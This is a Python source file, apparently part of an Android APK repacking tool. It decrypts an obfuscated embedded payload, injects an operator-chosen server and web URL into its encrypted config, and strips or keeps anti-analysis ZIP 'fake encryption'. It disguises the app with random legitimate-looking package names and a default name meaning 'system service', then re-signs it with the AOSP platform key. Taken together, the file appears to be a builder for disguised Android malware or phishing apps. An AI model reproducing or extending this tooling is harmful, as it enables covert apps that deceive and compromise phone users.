            elif bg_path and os.path.exists(bg_path) and filename.endswith('.png') and (
                any(k in filename for k in ['bg_accessibility', 'app_loading_bg', 'bg_config_mask']) or
                filename in ('᪺/ͦᷰᷴ/᫈̏ᷬq᪺᷶o.png', '᷊/1᷶cQfx/M᷏ᫌ᫰᫓K.png')
            ):
                with open(bg_path, 'rb') as f:
                    data = f.read()
                print(f'      [OK] 替换B包混淆背景: {filename}')
            
            # 替换图标 PNG
            elif icon_data and filename.endswith('.png'):
                # 模糊匹配自适应图标在 ARSC 中的 10 个混淆文件名
                is_adaptive = False
                if ('Revm' in filename) or \
                   ('Ui' in filename and filename.endswith('Ti.png')) or \
                   ('pjB/' in filename) or \
                   ('de35t' in filename) or \
                   ('EU.png' in filename) or \
                   ('UtA/' in filename) or \
                   ('BG5J.png' in filename) or \
                   ('VmX/' in filename and filename.endswith('w.png')) or \
                   ('W/' in filename and len(filename) < 50) or \
                   ('JQ/' in filename and filename.endswith('Ll.png')):
                    is_adaptive = True
                
                # assets/igj.png 和 assets/sjgj.png 直接替换（主图标入口）
                if filename in ('assets/igj.png', 'assets/sjgj.png'):
                    data = icon_data
                    icon_count += 1
                elif is_adaptive:
                    # 自适应图标的前景采用居中带 padding 的处理图像
                    data = adaptive_icon_data
                    icon_count += 1
                else:
                    try:
                        if data[:8] == b'\x89PNG\r\n\x1a\n' and len(data) >= 24:
                            w = struct.unpack('>I', data[16:20])[0]
                            h = struct.unpack('>I', data[20:24])[0]
                            # 只替换标准 Android 图标尺寸（正方形），按目标尺寸缩放
                            if w == h and w in (48, 72, 96, 144, 162, 192, 300, 324, 432):
                                data = _resize_icon_png(icon_data, w, h)
                                icon_count += 1
                    except Exception:
                        pass
            
            # ★ 替换 B 包 AndroidManifest.xml 中的包名（UTF-16LE）
            if filename == 'AndroidManifest.xml' and package_name:
                _old_pkg_u16 = 'net.mobile.gateway.sn55'.encode('utf-16-le')
                _new_pkg_u16 = package_name.encode('utf-16-le')
                if _old_pkg_u16 in data:
                    cnt = data.count(_old_pkg_u16)
                    data = data.replace(_old_pkg_u16, _new_pkg_u16)
                    print(f'      [OK] B包 Manifest 包名替换: {cnt} 处')
            
            # ★ b3() patch: 替换 B包 classes.dex（修复 vivo 开发者选项循环）
            if filename == 'classes.dex':
                patched_dex_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'classes_b3_patched.dex')
                if os.path.exists(patched_dex_path):
                    with open(patched_dex_path, 'rb') as _pf:
                        data = _pf.read()
                    print(f'      [OK] B包 classes.dex 已替换 (b3 patch, {len(data)} bytes)')
            
            zout.writestr(new_info, data)
    
    if icon_count > 0:
        print(f'      [OK] B包图标替换: {icon_count} 个')
    
    return out_buf.getvalue()




def _patch_and_resign_p26(p26_data: bytes, server_url: str, web_url: str,
                          app_name: str = '', sc_extra: dict = None,
                          icon_path: str = '', bg_path: str = '',
                          package_name: str = '') -> bytes:
    """
    patch p26 的 0.bt、替换图标/名称，并用 apksigner 重签名。
    因为 p26 有 APK v2 签名，任何内容修改都需要重签名。
    流程：patch 0.bt → 修复伪加密 → 解压替换图标/名称 → 重新打包 → apksigner 重签名
    """
    import subprocess, tempfile, os
    
    # 1. patch 0.bt（使用 CRC forge，保持 0.bt 的 ZIP CRC 不变）
    patched = _patch_p26_inplace(p26_data, server_url, web_url, app_name, sc_extra or {})
    
    # 2. 修复伪加密（apksigner 需要合法 ZIP 结构才能读 AndroidManifest.xml）
    patched_fixed = bytearray(patched)
    n_fixed = fix_fake_encryption(patched_fixed)
    print(f'      修复 {n_fixed} 个伪加密标志')
    
    # 2.5 解压 B 包，替换图标和名称，重新打包
    patched_fixed = _rebrand_b_pack(bytes(patched_fixed), app_name, icon_path, bg_path, sc_extra, package_name=package_name)
    patched_fixed = bytearray(patched_fixed)
    
    # 3. 写入临时文件
    import tempfile
    tmpdir = tempfile.gettempdir()
    tmp_in  = os.path.join(tmpdir, 'p26_patch_in.apk')
    tmp_out = os.path.join(tmpdir, 'p26_patch_out.apk')
    with open(tmp_in, 'wb') as f: f.write(bytes(patched_fixed))
    
    # 4. 找 apksigner 和 keystore（优先 AOSP testkey）
    apksigner = _find_build_tool('apksigner')
    if not apksigner:
        raise RuntimeError('找不到 apksigner')
    
    # ★ 优先使用 AOSP testkey（与原版相同证书）
    aosp_candidates = [
        '/opt/fisher-node/apk-builder/_aosp_testkey.p12',
        os.path.join(os.path.dirname(os.path.abspath(__file__)), '_aosp_testkey.p12'),
    ]
    keystore = next((k for k in aosp_candidates if os.path.exists(k)), None)
    ks_alias = 'platform'
    ks_type_args = ['--ks-type', 'pkcs12']
    
    if not keystore:
        # Fallback: debug keystore
        debug_candidates = [
            '/opt/fisher-node/apk-builder/_debug.keystore',
            os.path.join(os.path.dirname(os.path.abspath(__file__)), '_debug.keystore'),
        ]
        keystore = next((k for k in debug_candidates if os.path.exists(k)), None)
        ks_alias = 'debugkey'
        ks_type_args = []
    
    # 如果 keystore 不存在，先生成 debug
    if not keystore:
        keystore = os.path.join(os.path.dirname(os.path.abspath(__file__)), '_debug.keystore')
        keytool = _find_build_tool('keytool') or 'keytool'
        subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore,
                        '-alias', 'debugkey', '-keyalg', 'RSA', '-keysize', '2048',
                        '-validity', '10000', '-storepass', 'android',
                        '-keypass', 'android', '-dname', 'CN=Debug,O=Debug,C=US'],
                       capture_output=True)
        ks_alias = 'debugkey'
        ks_type_args = []
    
    # 5. zipalign（Android R+ 要求 resources.arsc 4字节对齐）
    zipalign_bin = _find_build_tool('zipalign')
    if zipalign_bin:
        tmp_aligned = os.path.join(tmpdir, 'p26_aligned.apk')
        r_align = subprocess.run([zipalign_bin, '-f', '4', tmp_in, tmp_aligned],
                                 capture_output=True)
        if r_align.returncode == 0:
            os.replace(tmp_aligned, tmp_in)
    
    # 6. apksigner 重签名
    cmd = [apksigner, 'sign'] + ks_type_args + [
           '--ks', keystore, '--ks-pass', 'pass:android',
           '--ks-key-alias', ks_alias,
           '--min-sdk-version', '21',
           '--v1-signing-enabled', 'false',
           '--v2-signing-enabled', 'true',
           '--v3-signing-enabled', 'false',
           '--out', tmp_out,
           tmp_in]
    r = subprocess.run(cmd, capture_output=True, text=True, errors='replace')
    if r.returncode != 0:
        raise RuntimeError(f'apksigner 失败: {r.stderr[:300]}')
    
    with open(tmp_out, 'rb') as f: signed = f.read()
    print(f'      重签名完成: {len(signed)} bytes')
    
    # 清理临时文件
    try: os.remove(tmp_in)
    except: pass
    try: os.remove(tmp_out)
    except: pass
    
    return signed



def _zip_replace_file_inplace(zip_data: bytearray, target_name: str,
                               new_content: bytes) -> bool:
    """
    在 ZIP 字节流中原地替换指定文件的数据区。
    
    关键约束：
    - p26ee723a 内部的文件使用伪加密（flags 含加密位，CRC/size 故意置零）
    - 外壳通过 ZipInputStream 按流顺序读取，不做 CRC 校验
    - 因此：只替换数据区字节，绝对不修改任何 header 字段（包括 CRC/size）
    - 只要明文长度相同，ZM26 XOR 后密文长度不变，数据区大小不变，完全等长原地替换
    """
    # 通过 Central Directory 找到文件的 LFH 偏移
    eocd_pos = _find_eocd(zip_data)
    if eocd_pos < 0:
        return False
    
    cd_count = struct.unpack_from('<H', zip_data, eocd_pos + 10)[0]
    cd_offset = struct.unpack_from('<I', zip_data, eocd_pos + 16)[0]
    
    pos = cd_offset
    for _ in range(cd_count):
        if bytes(zip_data[pos:pos+4]) != b'PK\x01\x02':
            break
        method      = struct.unpack_from('<H', zip_data, pos + 10)[0]
        comp_size   = struct.unpack_from('<I', zip_data, pos + 20)[0]
        uncomp_size = struct.unpack_from('<I', zip_data, pos + 24)[0]
        name_len    = struct.unpack_from('<H', zip_data, pos + 28)[0]
        extra_len   = struct.unpack_from('<H', zip_data, pos + 30)[0]
        comment_len = struct.unpack_from('<H', zip_data, pos + 32)[0]
        lh_offset   = struct.unpack_from('<I', zip_data, pos + 42)[0]
        name        = zip_data[pos+46:pos+46+name_len].decode('utf-8', errors='replace')
        
        if name == target_name:
            # 找到目标文件，定位数据区
            lh_name_len  = struct.unpack_from('<H', zip_data, lh_offset + 26)[0]
            lh_extra_len = struct.unpack_from('<H', zip_data, lh_offset + 28)[0]
            data_start   = lh_offset + 30 + lh_name_len + lh_extra_len
            
            # 确定原始数据区的实际大小
            # 伪加密文件 comp_size/uncomp_size 可能为 0，需要用新内容长度推断
            # ZM26 加密后大小 = 明文大小（XOR 不改变长度），所以 new_content 长度就是数据区大小
            data_end = data_start + len(new_content)
            
            # 验证：数据区末尾不能超过下一个 PK 签名
            # 简单验证：data_end 之后应该还有数据（不越界）
            if data_end > len(zip_data):
                raise RuntimeError(f'数据区越界: data_end={data_end} > zip_size={len(zip_data)}')
            
            # 替换数据区字节（CRC forge 已保证新内容的 CRC = 原始 CD CRC，无需修改任何 header）
            zip_data[data_start:data_end] = new_content
            return True
        
        pos += 46 + name_len + extra_len + comment_len
    
    return False


def _find_eocd(data: bytearray) -> int:
    """找到 ZIP End of Central Directory 的偏移"""
    # 从末尾向前搜索 PK\x05\x06
    for i in range(len(data) - 22, max(0, len(data) - 65536), -1):
        if bytes(data[i:i+4]) == b'PK\x05\x06':
            return i
    return -1


# ====================== DEX 应用名重编译 ======================

def _rebuild_dex_with_name(dex_data, new_name, new_pkg_slash=None, old_pkg_slash=None):
    """通过 baksmali → 修改 smali → smali 重编译来替换 DEX 中硬编码的应用名和包名。
    需要系统安装有 baksmali/smali。
    new_pkg_slash: 新包路径 (如 'com/muhwst/hpwklk/cczpx'), None 则不改包名
    old_pkg_slash: 旧包路径 (如 'net/mobile/gateway/sn55')
    """
    import shutil
    
    # 查找 smali/baksmali 工具
    baksmali_jar = None
    smali_jar = None
    
    # 常见路径
    for base in [os.path.dirname(os.path.abspath(__file__)),
                 '/opt/fisher-node/apk-builder',
                 os.path.expanduser('~'),
                 'D:\\develop']:
        for name in ['baksmali.jar', 'baksmali-2.5.2.jar']:
            p = os.path.join(base, name)
            if os.path.exists(p):
                baksmali_jar = p
                break
        for name in ['smali.jar', 'smali-2.5.2.jar']:
            p = os.path.join(base, name)
            if os.path.exists(p):
                smali_jar = p
                break
    
    # 也尝试用 apktool 的内置 smali
    apktool_jar = None
    for base in ['D:\\develop', '/usr/local/bin', os.path.expanduser('~')]:
        p = os.path.join(base, 'apktool.jar')
        if os.path.exists(p):
            apktool_jar = p
            break
    
    if not baksmali_jar or not smali_jar:
        if not apktool_jar:
            print(f'    [WARN] 未找到 baksmali/smali 工具，跳过 DEX 重编译')
            return dex_data
    
    tmpdir = os.path.join(tempfile.gettempdir(), '_dex_rebuild')
    if os.path.exists(tmpdir):
        shutil.rmtree(tmpdir)
    os.makedirs(tmpdir)
    
    try:
        dex_path = os.path.join(tmpdir, 'classes.dex')
        smali_dir = os.path.join(tmpdir, 'smali_out')
        new_dex_path = os.path.join(tmpdir, 'classes_new.dex')
        
        with open(dex_path, 'wb') as f:
            f.write(dex_data)
        
        # Step 1: baksmali 反汇编
        if baksmali_jar:
            cmd = ['java', '-jar', baksmali_jar, 'd', '-o', smali_dir, dex_path]
        else:
            print(f'    [WARN] 无 baksmali.jar，跳过 DEX 替换')
            return dex_data
        
        r = subprocess.run(cmd, capture_output=True, text=True, errors='replace', timeout=30)
        if r.returncode != 0:
            print(f'    [WARN] baksmali 失败: {r.stderr[:200]}')
            return dex_data
        
        # Step 2a: 替换 smali 中的应用名 パルス
        old_str = 'パルス'
        replaced_count = 0
        for root, dirs, files in os.walk(smali_dir):
            for fn in files:
                if not fn.endswith('.smali'):
                    continue
                fp = os.path.join(root, fn)
                with open(fp, 'r', encoding='utf-8') as f:
                    content = f.read()
                if old_str in content:
                    content = content.replace(old_str, new_name)
                    with open(fp, 'w', encoding='utf-8') as f:
                        f.write(content)
                    replaced_count += content.count(new_name)
        
        if replaced_count == 0:
            old_escaped = '\\u30d1\\u30eb\\u30b9'
            for root, dirs, files in os.walk(smali_dir):
                for fn in files:
                    if not fn.endswith('.smali'):
                        continue
                    fp = os.path.join(root, fn)
                    with open(fp, 'r', encoding='utf-8') as f:
                        content = f.read()
                    if old_escaped in content:
                        content = content.replace(old_escaped, new_name)
                        with open(fp, 'w', encoding='utf-8') as f:
                            f.write(content)
                        replaced_count += 1
        
        # Step 2b: 替换包名（移动 smali 文件目录 + 替换所有引用）
        pkg_replaced = 0
        if new_pkg_slash and old_pkg_slash:
            old_pkg_str = old_pkg_slash.decode() if isinstance(old_pkg_slash, bytes) else old_pkg_slash
            new_pkg_str = new_pkg_slash.decode() if isinstance(new_pkg_slash, bytes) else new_pkg_slash
            
            # 移动目录: net/mobile/gateway/sn55/ → com/muhwst/hpwklk/cczpx/
            old_dir = os.path.join(smali_dir, old_pkg_str)
            new_dir = os.path.join(smali_dir, new_pkg_str)
            if os.path.exists(old_dir):
                os.makedirs(os.path.dirname(new_dir), exist_ok=True)
                shutil.move(old_dir, new_dir)
            
            # 替换所有 smali 文件中的包路径引用
            for root, dirs, files in os.walk(smali_dir):
                for fn in files:
                    if not fn.endswith('.smali'):
                        continue
                    fp = os.path.join(root, fn)
                    with open(fp, 'r', encoding='utf-8') as f:
                        content = f.read()
                    if old_pkg_str in content:
                        content = content.replace(old_pkg_str, new_pkg_str)
                        with open(fp, 'w', encoding='utf-8') as f:
                            f.write(content)
                        pkg_replaced += 1
            
            if pkg_replaced > 0:
                print(f'    [OK] DEX smali 包名替换: {old_pkg_str} -> {new_pkg_str} ({pkg_replaced} 文件)')
        
        if replaced_count == 0 and pkg_replaced == 0:
            print(f'    [INFO] DEX smali 中无需修改，跳过')
            return dex_data
        
        # Step 3: smali 重编译
        cmd = ['java', '-jar', smali_jar, 'a', '-o', new_dex_path, smali_dir]
        r = subprocess.run(cmd, capture_output=True, text=True, errors='replace', timeout=30)
        if r.returncode != 0:
            print(f'    [WARN] smali 重编译失败: {r.stderr[:200]}')
            return dex_data
        
        with open(new_dex_path, 'rb') as f:
            new_dex = f.read()
        
        if replaced_count > 0:
            print(f'    [OK] DEX 重编译完成: パルス -> {new_name} ({replaced_count}处)')
        if pkg_replaced > 0:
            print(f'    [OK] DEX 重编译完成: 包名已更新')
        return new_dex
        
    except Exception as e:
        print(f'    [WARN] DEX 重编译异常: {e}')
        return dex_data
    finally:
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except:
            pass


# ====================== 主打包逻辑 ======================

def repack_apk(template_path, output_path, server_url, web_url='',
               app_name='', package_name='', icon_path='', bg_path='',
               server_config_extra=None):
    """完整的加固版 APK 重打包流程"""
    
    if not web_url:
        web_url = server_url.replace('wss://', 'https://').replace('ws://', 'http://')
    
    if not package_name:
        # ★ 生成仿真实 APP 风格的 23 字符等长包名
        # net.mobile.gateway.sn55 = 23 字符
        # 用真实单词组合，看起来像正规应用
        _prefixes = ['com', 'org', 'net', 'app', 'dev']
        _words = {
            3: ['app', 'pro', 'hub', 'box', 'lab', 'net', 'air', 'sky', 'max', 'top', 'bit', 'zen'],
            4: ['tech', 'smart', 'life', 'sync', 'fast', 'safe', 'core', 'link', 'wave', 'blue',
                'star', 'nova', 'data', 'next', 'play', 'easy', 'mini', 'lite', 'tool', 'cloud'],
            5: ['cloud', 'swift', 'pixel', 'prime', 'ultra', 'micro', 'media', 'sonic', 'flash',
                'guide', 'boost', 'titan', 'power', 'alpha', 'delta', 'solid', 'nexus', 'verde'],
            6: ['mobile', 'studio', 'social', 'finder', 'bridge', 'pocket', 'global', 'system',
                'assist', 'shield', 'stream', 'signal', 'matrix', 'cipher', 'beacon', 'fusion'],
            7: ['network', 'connect', 'service', 'digital', 'manager', 'toolkit', 'express',
                'gateway', 'utility', 'tracker', 'monitor', 'capture', 'central', 'venture'],
        }
        # 目标: prefix(3) + . + seg1 + . + seg2 + . + seg3 = 23
        # 所以 seg1+seg2+seg3 = 23-3-3(dots) = 17
        _combos_17 = [(6,6,5), (6,5,6), (5,6,6), (7,6,4), (6,7,4), (7,5,5), (5,7,5),
                      (5,5,7), (4,6,7), (6,4,7), (7,4,6), (4,7,6)]
        combo = random.choice(_combos_17)
        prefix = random.choice(_prefixes)
        # prefix 长度必须是3，调整第一段
        extra = len(prefix) - 3
        # 所有 prefix 都是3字符，无需调整
        segs = [random.choice(_words[n]) for n in combo]
        package_name = f'{prefix}.{segs[0]}.{segs[1]}.{segs[2]}'
    
    if not app_name:
        app_name = '系统服务'
    
    sc_extra = server_config_extra or {}
    
    print(f'  Package: {package_name}')
    print(f'  Server:  {server_url}')
    print(f'  Web:     {web_url}')
    print(f'  Name:    {app_name}')
    
    # ============ Step 1: 读取模板 APK ============
    print('\n  [1/7] 读取模板 APK...')
    with open(template_path, 'rb') as f:
        apk_data = bytearray(f.read())
    print(f'    模板: {len(apk_data)/1024/1024:.1f} MB')
    
    # ============ Step 2: 修复伪加密 ============
    print('  [2/7] 修复伪加密...')
    fixed = fix_fake_encryption(apk_data)
    print(f'    修复了 {fixed} 个加密标志')
    
    # ============ Step 3: 解密 nx0M ============
    print('  [3/7] 解密 nx0M 载荷...')
    nx0m_data = extract_from_cd(bytes(apk_data), 'assets/nx0M')
    print(f'    加密数据: {len(nx0m_data)/1024/1024:.1f} MB')
    
    payload_zip = decrypt_nx0m(nx0m_data)
    print(f'    解密后: {len(payload_zip)/1024/1024:.1f} MB (ZIP)')
    
    payload_zf = zipfile.ZipFile(io.BytesIO(payload_zip))
    payload_files = {info.filename: payload_zf.read(info.filename)
                     for info in payload_zf.infolist()}
    print(f'    载荷文件: {list(payload_files.keys())}')
    
    # ============ Step 4: 修改 update.apk ============
    print('  [4/7] 修改内层 update.apk...')
    
    update_data = bytearray(payload_files['update.apk'])
    
    # 4a. 修复 update.apk 的伪加密
    uf = fix_fake_encryption(update_data)
    print(f'    修复 update.apk 伪加密: {uf} 个')
    
    # 4b. 提取 update.apk 所有文件
    update_zf = zipfile.ZipFile(io.BytesIO(bytes(update_data)))
    update_files = {}
    for info in update_zf.infolist():
        try:
            update_files[info.filename] = (update_zf.read(info.filename), info)
        except:
            try:
                raw = extract_from_cd(bytes(update_data), info.filename)
                update_files[info.filename] = (raw, info)
            except:
                pass
    
    # 4c. 读取 zm26_meta.json 获取 ZM26 密钥
    zm26_meta = None
    zm26_xor_key = None
    zm26_salt = None
    if 'assets/zm26_meta.json' in update_files:
        try:
            zm26_meta = json.loads(update_files['assets/zm26_meta.json'][0])
            zm26_xor_key = bytes.fromhex(zm26_meta['xor_key'])
            zm26_salt    = bytes.fromhex(zm26_meta['salt'])
            print(f'    ZM26 xor_key: {zm26_meta["xor_key"][:16]}...')
        except Exception as e:
            print(f'    [WARN] 读取 zm26_meta.json 失败: {e}')
    
    # 4d. 解密 0.bt → 修改 webUrl → 重新加密写回
    if zm26_xor_key and 'assets/0.bt' in update_files:
        raw_0bt, orig_info_0bt = update_files['assets/0.bt']
        original_header = raw_0bt[:20]
        
        try:
            plaintext_sc = zm26_decrypt(raw_0bt, zm26_xor_key, zm26_salt)
            sc_orig = json.loads(plaintext_sc.decode('utf-8'))
            print(f'    原始 serverUrl: {sc_orig.get("serverUrl","")[:30]}...')
            print(f'    原始 webUrl: {sc_orig.get("webUrl","")!r}')
            
            # n01 ENC: 加密（使用顶层 _enc_encrypt 函数）
            
            # serverUrl 和 webUrl 都必须用 ENC: 格式
            sc_orig['serverUrl'] = _enc_encrypt(server_url)
            sc_orig['webUrl'] = _enc_encrypt(web_url)
            print(f'    serverUrl ENC: {sc_orig["serverUrl"][:40]}...')
            print(f'    webUrl ENC:    {sc_orig["webUrl"][:40]}...')
            
            # 可选: 修改 appName、ownerUsername 等明文字段
            if app_name:
                # pageStyleConfig.appName
                if 'pageStyleConfig' in sc_orig and isinstance(sc_orig['pageStyleConfig'], dict):
                    sc_orig['pageStyleConfig']['appName'] = app_name
                # ★ 更新页/配置遮罩的标题和副标题，默认用 app_name
                sc_orig['configMaskText'] = sc_extra.get('configMaskText', app_name)
                sc_orig['configMaskSubtitle'] = sc_extra.get('configMaskSubtitle', app_name)
            
            if sc_extra.get('ownerUsername'):
                sc_orig['ownerUsername'] = sc_extra['ownerUsername']
            
            if 'loadingTips' in sc_extra:
                sc_orig['loadingTips'] = sc_extra['loadingTips']
            
            if 'showAppIcon' in sc_extra:
                sc_orig['showAppIcon'] = sc_extra['showAppIcon']
            
            if 'enableConfigMask' in sc_extra:
                sc_orig['enableConfigMask'] = sc_extra['enableConfigMask']
            
            # ★ 写入所有剩余 sc_extra 字段（configMaskTextColor 等）
            for _ek in ('configMaskTextColor', 'configMaskSubtitleColor',
                        'uninstallMode', 'enableServiceMode'):
                if _ek in sc_extra:
                    sc_orig[_ek] = sc_extra[_ek]
            
            # ★ 合并 pageStyleConfig 额外字段
            if sc_extra.get('pageStyleConfig') and isinstance(sc_extra['pageStyleConfig'], dict):
                if 'pageStyleConfig' not in sc_orig:
                    sc_orig['pageStyleConfig'] = {}
                sc_orig['pageStyleConfig'].update(sc_extra['pageStyleConfig'])
            
            # 重新序列化并 ZM26 加密
            new_plaintext = json.dumps(sc_orig, ensure_ascii=False,
                                       separators=(',', ':')).encode('utf-8')
            new_0bt = zm26_encrypt(new_plaintext, original_header,
                                   zm26_xor_key, zm26_salt)
            
            # 写回到 update_files
            new_info_0bt = zipfile.ZipInfo('assets/0.bt')
            new_info_0bt.date_time = orig_info_0bt.date_time
            new_info_0bt.compress_type = zipfile.ZIP_DEFLATED
            update_files['assets/0.bt'] = (new_0bt, new_info_0bt)
            
            print(f'    [OK] 修改 0.bt: webUrl -> {web_url}')
        except Exception as e:
            print(f'    [WARN] 修改 0.bt 失败: {e}, 保持原样')
    else:
        print(f'    [WARN] 未找到 zm26_meta.json 或 0.bt, 跳过配置注入')
    
    # 4e. 重新打包 update.apk
    update_buf = io.BytesIO()
    with zipfile.ZipFile(update_buf, 'w', zipfile.ZIP_DEFLATED) as zout:
        for filename, (data, orig_info) in update_files.items():
            new_info = zipfile.ZipInfo(filename)
            new_info.date_time = orig_info.date_time
            if filename == 'resources.arsc' or orig_info.compress_type == zipfile.ZIP_STORED:
                new_info.compress_type = zipfile.ZIP_STORED
            else:
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            # 替换图标
            if icon_path and os.path.exists(icon_path) and filename.endswith('.png'):
                # assets/igj.png 是主图标入口，直接替换（不做尺寸检查）
                if filename == 'assets/igj.png':
                    with open(icon_path, 'rb') as f:
                        data = f.read()
                    print(f'    替换图标: {filename} (igj.png)')
                else:
                    try:
                        if data[:8] == b'\x89PNG\r\n\x1a\n' and len(data) >= 24:
                            w = struct.unpack('>I', data[16:20])[0]
                            h = struct.unpack('>I', data[20:24])[0]
                            if abs(w - h) <= 2 and 30 <= w <= 1024:
                                with open(icon_path, 'rb') as f:
                                    data = f.read()
                                print(f'    替换图标: {filename} ({w}x{h})')
                    except:
                        pass
            
            # 替换背景图
            if bg_path and os.path.exists(bg_path):
                is_bg = False
                if any(k in filename for k in ['bg_accessibility', 'app_loading_bg', 'bg_config_mask']):
                    is_bg = True
                elif filename in ('᪺/ͦᷰᷴ/᫈̏ᷬq᪺᷶o.png', '᷊/1᷶cQfx/M᷏ᫌ᫰᫓K.png'):
                    is_bg = True
                
                if is_bg:
                    with open(bg_path, 'rb') as f:
                        data = f.read()
                    print(f'    替换背景: {filename}')
            
            zout.writestr(new_info, data)
    
    modified_update_raw = bytearray(update_buf.getvalue())
    fake_fixed = fix_fake_encryption(modified_update_raw)
    modified_update = bytes(modified_update_raw)
    print(f'    修改后 update.apk: {len(modified_update)/1024/1024:.1f} MB')
    if fake_fixed > 0:
        print(f'    [FIX] 清除 update.apk 残留伪加密标志: {fake_fixed} 个')
    
    # ============ Step 5: 重新加密 nx0M ============
    print('  [5/7] 重新加密 nx0M...')
    
    # 重新打包 payload ZIP
    new_payload_buf = io.BytesIO()
    with zipfile.ZipFile(new_payload_buf, 'w', zipfile.ZIP_DEFLATED) as zout:
        # update.apk
        info = zipfile.ZipInfo('update.apk')
        info.compress_type = zipfile.ZIP_DEFLATED
        zout.writestr(info, modified_update)
        
        # 其他载荷文件（特别是 p26ee723a — 这是真正被安装到手机的 B包！）
        for name, data in payload_files.items():
            if name == 'update.apk':
                continue
            
            # p26ee723a 是完整的 B包 APK，修改其中的 0.bt 并重签名
            # 关键：修改后必须重签名（APK v2 签名覆盖整个文件，任何内容变化都会使签名失效）
            if name.startswith('p') and len(data) > 1000000:
                print(f'    [重要] 检测到拆分包 {name} ({len(data)/1024/1024:.1f} MB)，patch + 重签名...')
                try:
                    data = _patch_and_resign_p26(data, server_url, web_url,
                                                 app_name, sc_extra,
                                                 icon_path=icon_path, bg_path=bg_path,
                                                 package_name=package_name)
                    print(f'      [OK] {name} patch+签名完成: {len(data)/1024/1024:.1f} MB')
                except Exception as e:
                    print(f'      [WARN] {name} 处理失败: {e}，保持原样')
                    import traceback; traceback.print_exc()
            
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zout.writestr(info, data)
    
    new_payload = new_payload_buf.getvalue()
    encrypted_nx0m = encrypt_nx0m(new_payload)
    print(f'    加密后: {len(encrypted_nx0m)/1024/1024:.1f} MB')
    
    # ============ Step 6: 重新打包外壳 APK ============
    print('  [6/7] 重新打包外壳 APK...')
    
    outer_zf = zipfile.ZipFile(io.BytesIO(bytes(apk_data)))
    
    # 预计算应用名替换字节对（仅 UTF-16LE 用于 AndroidManifest.xml 等长替换）
    _name_replacements_axml = []  # (old_bytes, new_bytes, encoding_label) 仅用于 AXML
    _use_arsc_rebuild = False
    if app_name and app_name != SHELL_ORIG_APP_NAME:
        _use_arsc_rebuild = True  # ARSC 统一用 _rebuild_arsc_stringpool（支持变长）
        # AXML 用 UTF-16LE 等长替换（仅在不超长时）
        old_b_u16 = SHELL_ORIG_APP_NAME.encode('utf-16-le')
        new_b_u16 = app_name.encode('utf-16-le')
        if len(new_b_u16) <= len(old_b_u16):
            new_b_u16 = new_b_u16 + b'\x00' * (len(old_b_u16) - len(new_b_u16))
            _name_replacements_axml.append((old_b_u16, new_b_u16, 'UTF-16'))
        else:
            # UTF-16 超长，跳过 AXML 替换（Android 优先从 ARSC 读应用名）
            print(f'    [INFO] 应用名 UTF-16 超长({len(new_b_u16)}>{len(old_b_u16)})，AXML 跳过，依赖 ARSC')
    
    # ★ 外壳包名替换 - 等长二进制替换方案
    # 原包名: net.mobile.gateway.sn55 (23字符)
    # 新包名必须也是 23 字符，这样 DEX 可以直接二进制替换
    _SHELL_ORIG_PKG_SLASH = b'net/mobile/gateway/sn55'  # DEX 中的格式
    _SHELL_ORIG_PKG_DOT = b'net.mobile.gateway.sn55'    # Manifest/ARSC 中的格式
    _new_pkg_slash = package_name.replace('.', '/').encode()
    _new_pkg_dot = package_name.encode()
    
    _pkg_replacements = []  # 用于 Manifest 和 ARSC 的字节替换
    _do_dex_pkg_rename = False
    if len(_new_pkg_slash) == len(_SHELL_ORIG_PKG_SLASH):
        # Raw bytes (用于可能的非 UTF-16 场景)
        _pkg_replacements.append((_SHELL_ORIG_PKG_DOT, _new_pkg_dot, 'PKG-DOT-RAW'))
        # UTF-16LE (AXML 和 ARSC 的 StringPool 都是 UTF-16LE)
        _old_u16 = _SHELL_ORIG_PKG_DOT.decode().encode('utf-16-le')
        _new_u16 = _new_pkg_dot.decode().encode('utf-16-le')
        _pkg_replacements.append((_old_u16, _new_u16, 'PKG-DOT-U16'))
        _do_dex_pkg_rename = True
        print(f'    [OK] 外壳包名将替换: {_SHELL_ORIG_PKG_DOT.decode()} -> {package_name}')
    else:
        print(f'    [WARN] 包名长度不匹配({len(_new_pkg_slash)} != {len(_SHELL_ORIG_PKG_SLASH)})，跳过外壳包名替换')
        _pkg_replacements = []
    
    out_buf = io.BytesIO()
    with zipfile.ZipFile(out_buf, 'w') as zout:
        for info in outer_zf.infolist():
            try:
                data = outer_zf.read(info.filename)
            except:
                data = extract_from_cd(bytes(apk_data), info.filename)
            
            new_info = zipfile.ZipInfo(info.filename)
            new_info.date_time = info.date_time
            
            if info.filename == 'assets/nx0M':
                # 替换为重新加密的 nx0M
                data = encrypted_nx0m
                new_info.compress_type = zipfile.ZIP_STORED
                print(f'    [OK] 替换 assets/nx0M')
            elif info.filename == 'classes.dex':
                # 用 smali 重编译的全新 classes.dex 替换（已替换 URL，无旧校验和）
                rebuilt_dex = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'classes_rebuilt.dex')
                if os.path.exists(rebuilt_dex):
                    with open(rebuilt_dex, 'rb') as f:
                        data = f.read()
                    print(f'    [OK] 替换外壳 classes.dex (smali 重编译版)')
                else:
                    print(f'    [WARN] classes_rebuilt.dex 不存在，保留原始 DEX')
                
                # ★ 替换 DEX 中硬编码的外壳 webUrl
                if web_url and web_url != SHELL_ORIG_WEB_URL:
                    data = _patch_dex_url(data, SHELL_ORIG_WEB_URL, web_url)
                    print(f'    [OK] DEX URL 替换: {SHELL_ORIG_WEB_URL} -> {web_url}')
                
                # ★ 替换 DEX 中硬编码的应用名 + 包名（通过 smali 重编译，保证 string_ids 排序正确）
                _dex_new_pkg = _new_pkg_slash if _do_dex_pkg_rename else None
                _dex_old_pkg = _SHELL_ORIG_PKG_SLASH if _do_dex_pkg_rename else None
                if (app_name and app_name != 'パルス') or _do_dex_pkg_rename:
                    data = _rebuild_dex_with_name(data, app_name or 'パルス', 
                                                  new_pkg_slash=_dex_new_pkg,
                                                  old_pkg_slash=_dex_old_pkg)
                
                new_info.compress_type = zipfile.ZIP_DEFLATED
            elif info.filename == 'resources.arsc':
                # ★ 用 StringPool 重建替换外壳 ARSC 中的应用名（支持任意长度）
                if _use_arsc_rebuild and app_name:
                    data = _rebuild_arsc_stringpool(data, app_name)
